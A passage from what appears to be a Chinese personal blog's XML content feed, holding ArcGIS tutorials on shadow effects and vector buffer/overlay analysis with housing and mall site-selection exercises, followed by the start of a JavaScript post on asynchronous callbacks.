data-src="/2020/07/20/ArcGIS/ArcGIS%E5%88%B6%E4%BD%9C%E9%98%B4%E5%BD%B1%E6%95%88%E6%9E%9C%E6%80%BB%E7%BB%93/8208152b3fe329c20083f35a74182497.png" alt="8208152b3fe329c20083f35a74182497"></p></li><li><p>这样，边缘的阴影效果就会变得比较柔和，不过，这种方法对于较小的多边形效果不明显，这时可以使用【】的方式修正</p></li><li><p>使用方式修正阴影</p></li><li><p>在内容列表中，修改查看方式为【按选择列出】，对转为制图表达的要素类，点击第一个图标最后使这个图层为选中状态；<img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%88%B6%E4%BD%9C%E9%98%B4%E5%BD%B1%E6%95%88%E6%9E%9C%E6%80%BB%E7%BB%93/a2c7bad4b5f8a50b04d16655e922392b.png" alt="a2c7bad4b5f8a50b04d16655e922392b"></p></li><li><p>调出制图表达工具条和编辑工具条；</p></li><li><p>点击【开始编辑】这个要素类；</p></li><li><p>在制图表达工具条上，使用箭头选择阴影效果不正确的多边形；</p></li><li><p>在制图表达工具条上，点击制图表达属性来显示被选中的多边性的值表达规则，属性表会在左侧的内容列表中出现；</p></li><li><p>修改百分比值，小多边形需要将该值调大，本实验中，改为60-90；</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%88%B6%E4%BD%9C%E9%98%B4%E5%BD%B1%E6%95%88%E6%9E%9C%E6%80%BB%E7%BB%93/2c360324dd04e1fca67a807847438bb5.png" alt="2c360324dd04e1fca67a807847438bb5"></p></li><li><p>在编辑工具条上，停止编辑并进行保存。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> ArcGIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIS </tag>
            
            <tag> ArcGIS </tag>
            
            <tag> 空间分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ArcGIS矢量数据分析方法及典型应用实例</title>
      <link href="/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/"/>
      <url>/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>矢量数据不同于栅格数据，一般不存在模式化的分析处理方法。在ArcGIS中，矢量数据的空间分析主要集中于缓冲分析、叠置分析、网络分析和追踪分析等方面。通过该实验掌握缓冲区的基本原理、缓冲区建立和缓冲区分析的基本方法；理解矢量数据空间叠加分析的基本原理、掌握常用的空间叠加分析方法；通过具体应用实例进行市区择房分析和大型超市选址综合应用，进一步掌握和理解叠置分析和缓冲分析。</p><p>关键词：空间分析；缓冲分析；叠置分析；选址问题</p><h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>1.掌握缓冲区的基本原理；</p><p>2.掌握缓冲区建立和缓冲区分析的基本方法；</p><p>3.掌握矢量数据空间叠加分析的基本原理；</p><p>4.掌握常用的空间叠加分析方法；</p><p>5.掌握具体的应用实例—-选址问题；</p><h1 id="缓冲区分析"><a href="#缓冲区分析" class="headerlink" title="缓冲区分析"></a>缓冲区分析</h1><h2 id="1-实验内容"><a href="#1-实验内容" class="headerlink" title="1.实验内容"></a>1.实验内容</h2><p>某房地产商准备开发一个住宅小区，需要对城市噪声进行分析，拟通过计算各地的噪声强度找出受噪声影响较小的区域。</p><h2 id="2-实验步骤"><a href="#2-实验步骤" class="headerlink" title="2.实验步骤"></a>2.实验步骤</h2><p>1）打开ArcMap，加载城市路网数据streets；</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/0eb09d8135f0aceceb76392d0eea014d.png" alt="0eb09d8135f0aceceb76392d0eea014d"></p><p>​                                                            图一 路网数据</p><p>2）加载缓冲区工具</p><p>在菜单栏下选择【自定义】|【自定义模式】|【命令】|【工具】|【缓冲向导】|<br>将其拖拉到任意工具条空白处；</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/67be73a54bb1c3b66eea54bb627563af.png" alt="67be73a54bb1c3b66eea54bb627563af"></p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/80e70ff1c0b38241ea4e8b65db6c995f-1595216817760.png" alt="80e70ff1c0b38241ea4e8b65db6c995f"></p><p>​                                                                    图二 调出缓冲向导工具</p><p>3）根据道路噪声衰减的特点并研究路网数据的空间范围，确定适宜的缓冲距离及缓冲区数量；</p><p>①缓冲区距离：100米；</p><p>②缓冲区数量：20个；</p><p>4）点击第2步中添加的缓冲向导按钮，打开对话框，选择需要建立缓冲区的数据strees图层</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/802d8699df59f627ca83996472ebd734.png" alt="802d8699df59f627ca83996472ebd734"></p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/deec726beed03e100130259f721779e9.png" alt="deec726beed03e100130259f721779e9"></p><p>图三 设置缓冲向导图层及参数</p><p>5）生成缓冲区</p><p>设置缓冲区的合并及保存路径，单击【确定】生成多环缓冲区</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/64514417d372859b7e223fbce0479c62.png" alt="64514417d372859b7e223fbce0479c62"></p><p>图四 多环缓冲区图</p><p>6）在缓冲区数据的属性表中添加一个长整型类型的字段MeanDist（平均距离），打开字段选择器，在文本框中输入‘([FromBufDist]</p><ul><li>[ToBufDist]) / 2’;</li></ul><p>7）在属性表中再添加一个双精度类型的字段Noise，打开字段选择器，在文本框中输入‘100<br>^ (1 – [MeanDist] / 2000)’</p><p>（100指假设每个道路产生噪声为100，2000指噪声影响的最大距离）</p><p>8）将噪声数据转换成栅格数据</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/99849d0397cd3a1942146890b1c0a45a.png" alt="99849d0397cd3a1942146890b1c0a45a"></p><p>图五 多环缓冲区图栅格化</p><h1 id="叠加分析"><a href="#叠加分析" class="headerlink" title="叠加分析"></a>叠加分析</h1><h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><p>根据规划道路的中心线及道路红线宽度（100m），确定各村将被征用的各类土地，并完成面积的分类统计表。</p><p>多边形与多边形叠加：</p><ol><li><p>图形之间要产生切割；</p></li><li><p>属性之间要产生继承；</p></li></ol><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>1）打开ArcMap，加载数据，调整图层顺序，浏览数据；</p><p>2）打开‘道路用地统计表.xls’了解需要统计的数据；</p><p>3）以road为输入数据，以50米（缓冲区半径采用道路红线宽度的一半）建立缓冲区，产生道路用地范围数据，【分析工具】|【领域分析】|【缓冲区】；</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/bf2f2d02fd1dd1b65f8fde3c8e3b8d96.png" alt="bf2f2d02fd1dd1b65f8fde3c8e3b8d96"></p><p>​                                                                        图一 缓冲区工具</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/5b5218162010667ea1579970525ee49e.png" alt="5b5218162010667ea1579970525ee49e"></p><p>​                                                                    图二 生成道路缓冲区</p><p>4）将缓冲区道路与土地利用信息空间叠加，【分析工具】|【领域分析】|【相交】得到道路用地范围的土地利用数据；</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/6ed6f4217abeef958afb15a17af02737.png" alt="6ed6f4217abeef958afb15a17af02737"></p><p>​                                                                        图三 将土地进行叠加—-相交</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/4ac7ec8204518ee1744d6ffa4bb1b4c1.png" alt="4ac7ec8204518ee1744d6ffa4bb1b4c1"></p><p>​                                                                    图四 叠加—-相交</p><p>5）利用【分析工具】|【叠加分析】|【标识】将得到的用地范围内的土地再与village进行叠加；</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/219723d9927c1595da532555306f4bb9.png" alt="219723d9927c1595da532555306f4bb9"></p><p>​                                                                                图五 将村落标识叠加</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/8f422cd33eb97573b68a63b247a29baa.png" alt="8f422cd33eb97573b68a63b247a29baa"></p><p>​                                                                                图六 村落标识</p><p>6）在经过叠加后的属性表上添加一个双精度类型的新字段newArea，单击右键【计算几何】，重新计算面积；</p><p>7）重算土地类型代码，在属性表上添加一个长整型的新字段newCODE，右键【字段计算器】在文本框输入‘left([CODE],1)’提取各类土地的一级代码；</p><p>8）面积分类汇总，打开【分析工具】|【统计分析】|【频数】统计各村各类土地的面积；</p><p>9）将表格输出；</p><p>10）在EXCEL表中整理并按表格的要求进行单位换算与填写。</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/15993cf6ccf0b70d163421f4efb4e7f4.png" alt="15993cf6ccf0b70d163421f4efb4e7f4"></p><p>​                                                                图七 道路用地分村统计表</p><h1 id="应用实例一-市区择房分析"><a href="#应用实例一-市区择房分析" class="headerlink" title="应用实例一 市区择房分析"></a>应用实例一 市区择房分析</h1><h2 id="实验内容-1"><a href="#实验内容-1" class="headerlink" title="实验内容"></a>实验内容</h2><p>所寻求的市区是噪声要小，距离盛业中心和各大名牌高中要近，环境优雅离名胜古迹较近，给预定一个定量限定如下：</p><p>（1）离主要市区交通要道200m之外，交通要到的车流量大，噪声产生的主要源于此（ST为道路类型中的只要市区交通要道）；</p><p>（2）距大型商业中心的影响，以商业中心的代销来确定影响区域，具体是以属性字段YUZHI；</p><p>（3）距名牌高中在750m之内，以便小孩上学便捷；</p><p>（4）距名胜古迹500m之内；</p><p>最后分别将满足上诉条件的其中一个条件的取值为1，不满足的取值为0，即如果满足距主要市区交通要道200m之内，取值为1，反之为0；其他亦是如此，最后将其累加得到分级。即满足三个条件累加得到3，满足2个条件的得到2，最后将全部分为4级。</p><h2 id="实验步骤-1"><a href="#实验步骤-1" class="headerlink" title="实验步骤"></a>实验步骤</h2><p><strong>一、缓冲区分析</strong></p><p>1.主干道噪声缓冲区的建立</p><p>（1）选择交通网络图层（network.shp）打开图层属性表，左上角【表选项】|【按属性选择】输入‘TYPE=ST’，选择出市区主要道路出来；</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/c728c5cbbc4f8c4d9a120a630978dac0.png" alt="c728c5cbbc4f8c4d9a120a630978dac0"></p><p>（2）调出缓冲向导</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/e4cce71d3c12609edd91adad9e6bf3ec.png" alt="e4cce71d3c12609edd91adad9e6bf3ec"></p><p>【自定义】|【自定义模式】|【命令】|【工具】|【缓冲向导】将其拖到菜单栏空白处；</p><p>（3）【缓冲向导】对话框，按照需求选择；</p><p>2.完成交通（噪声）、商业中心、学校、名胜古迹的缓冲分布图</p><p><strong><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/1133f718f0aae28106eb737963939d64.png" alt="1133f718f0aae28106eb737963939d64"></strong></p><p>​                                                                        图二 市区交通要道200m之外缓冲区</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/1397f59a4abc76388f6daa7f7825379c.png" alt="1397f59a4abc76388f6daa7f7825379c"></p><p>​                                                            图三 商业中心影响范围缓冲区</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/158ef3cc7a8d299f16af9117cdcd2661.png" alt="158ef3cc7a8d299f16af9117cdcd2661"></p><p>​                                                                                        图四 名牌高中的覆盖范围</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/90699aa4a8af34678ae6fa146254c93c.png" alt="90699aa4a8af34678ae6fa146254c93c"></p><p>​                                                                    图五 名胜古迹的周边覆盖影响范围</p><p><strong>二、叠置分析</strong></p><p>1.对商业中心、名牌高中、名胜古迹进行【叠置分析】中的【交集】操作，具体如下：</p><p>【分析工具】|【叠加分析】|【相交】| three.shp</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/627365e3a600349085425493d566bbf3.png" alt="627365e3a600349085425493d566bbf3"></p><p>​                                                                    图六 满足三个条件的区域</p><p>2.利用交通（噪声）缓冲分布图对生成的three.shp进行擦除处理，具体如下：</p><p>【分析工具】|【叠加分析】|【擦除】| four.shp</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/04992b9010c425f663f8df53f833fad5.png" alt="04992b9010c425f663f8df53f833fad5"></p><p>​                                                                        图七 购房者的最佳选择区域</p><p>3.分级别</p><p>满足四个条件为第一等级，以此类推</p><ol><li><p>分别打开商业中心、名牌高中、名胜古迹的缓冲区图层添加market、school、famous字段，全部赋值1；</p></li><li><p>打开交通（噪声）缓冲区图层添加voice字段，赋值-1（这里取-1的原因是噪声缓冲区之外才是满足要求的）；</p></li><li><p>【分析工具】|【叠加分析】|【联合】| union.shp</p></li></ol><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/e4cc9a02c582455a4d3bf88b8ff6a761.png" alt="e4cc9a02c582455a4d3bf88b8ff6a761"></p><p>​                                                                        图八 四个缓冲区的叠加图</p><ol><li><p>打开生成的union.shp的属性表，添加class字段，右键【字段计算器】输入“class=market+voice+school+famous”；</p></li><li><p>符号化</p></li></ol><p>根据class进行分级表达；</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/8a12b4144887e44c2d88054f56d8acbf.png" alt="8a12b4144887e44c2d88054f56d8acbf"></p><p>​                                                                    图九 区域居住适宜性分级</p><h1 id="应用实例二-大型商场选址"><a href="#应用实例二-大型商场选址" class="headerlink" title="应用实例二 大型商场选址"></a>应用实例二 大型商场选址</h1><h2 id="实验内容-2"><a href="#实验内容-2" class="headerlink" title="实验内容"></a>实验内容</h2><p>要求</p><p>待寻找地区的区位条件为：</p><ol><li><p>离城市主要交通线路50m以内，以保证商场交通的通达性；</p></li><li><p>保证在居民区100m范围内，便于居民步行到达商场；</p></li><li><p>距停车场100m范围内，便于顾客停车；</p></li><li><p>距已经存在的商场500m范围之外，减少竞争压力。</p></li></ol><h2 id="实验步骤-2"><a href="#实验步骤-2" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>说明：由于此实验与实验三步骤一致，此处不再赘述。</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/4801a99f49b3f326a55e3061e3d66927-1595217223005.png" alt="4801a99f49b3f326a55e3061e3d66927"></p><p>​                                                                    图一 离城市主要交通线路50m以内</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/9ce289ab19ab7582206173ff8613a425.png" alt="9ce289ab19ab7582206173ff8613a425"></p><p>​                                                            图二 在居民区100m范围内</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/28d6a77328d4e569c9402628284cb30b.png" alt="28d6a77328d4e569c9402628284cb30b"></p><p>​                                                                图三 距停车场100m范围内</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/98d69051ee6eb927a968a044910a2476.png" alt="98d69051ee6eb927a968a044910a2476"></p><p>​                                                            图四 已经存在的商场500m范围</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/1ed6a9659883511bc7793b3502c559fd.png" alt="1ed6a9659883511bc7793b3502c559fd"></p><p>​                                                                            图五 相交结果</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/bb3d6f4ba884f3782b9751040a23922b.png" alt="bb3d6f4ba884f3782b9751040a23922b"></p><p>​                                                                            图六 擦除结果</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/d0cf4d2d306fee794741c8381e352eab.png" alt="d0cf4d2d306fee794741c8381e352eab"></p><p>​                                                                        图七 联合结果</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/bffab35aaf89e0642df334b0de856cc2.jpg" alt="bffab35aaf89e0642df334b0de856cc2"></p><p>​                                                                            图八 商场选址适宜性分析结果</p><h1 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h1><p>通过本实验，了解到了矢量数据不同于栅格数据，一般不存在模式化的分析处理方法。在ArcGIS中，矢量数据的空间分析主要集中于缓冲分析、叠置分析、网络分析和追踪分析等方面。通过该实验掌握缓冲区的基本原理、缓冲区建立和缓冲区分析的基本方法；理解矢量数据空间叠加分析的基本原理、掌握常用的空间叠加分析方法；通过具体应用实例进行市区择房分析和大型超市选址综合应用，进一步掌握和理解叠置分析和缓冲分析。</p>]]></content>
      
      
      <categories>
          
          <category> ArcGIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIS </tag>
            
            <tag> ArcGIS </tag>
            
            <tag> 空间分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>异步编程</title>
      <link href="/2020/07/20/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B/"/>
      <url>/2020/07/20/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="得到函数内部异步操作的结果"><a href="#得到函数内部异步操作的结果" class="headerlink" title="得到函数内部异步操作的结果"></a>得到函数内部异步操作的结果</h1><p>回调函数：通过一个函数，获取函数内部的操作。（根据输入得到输出结果）</p><ul><li>在该情况下无法获得函数内异步操作的结果</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a + b)</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">2</span>)</span><br><span class="line">        ret = a + b</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line">    &#125;, <span class="number">6000</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">3</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">get</span>(20,30))</span><br></pre></td></tr></table></figure><p>结果：返回<code>undefined</code></p><p><img src= "/img/loading.gif" data-src="/2020/07/20/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B/image-20200524151737456.png" alt="image-20200524151737456">    </p><ul><li>若要获得该数据则只能通过回调函数</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a + b)</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="number">2</span>)</span><br><span class="line">        ret = a + b</span><br><span class="line">        <span class="keyword">return</span> c(ret)</span><br><span class="line">    &#125;, <span class="number">6000</span>); </span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">3</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(get(20,30))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">get</span>(20, 30, function(a) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>结果</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B/image-20200524152155139.png" alt="image-20200524152155139">    </p><ul><li><p>注意：</p><p>凡是需要得到一个函数内部异步操作的结果（setTimeout,readFile,writeFile,ajax,readdir）</p><p>这种情况必须通过 回调函数 (异步API都会伴随着一个回调函数)</p></li></ul><h1 id="回调地狱"><a href="#回调地狱" class="headerlink" title="回调地狱"></a>回调地狱</h1><h2 id="啥是回调地狱"><a href="#啥是回调地狱" class="headerlink" title="啥是回调地狱"></a>啥是回调地狱</h2><p>就是这幅图（图源网络）</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B/image-20200527211637374.png" alt="image-20200527211637374"></p><h2 id="为什么会有回调地狱"><a href="#为什么会有回调地狱" class="headerlink" 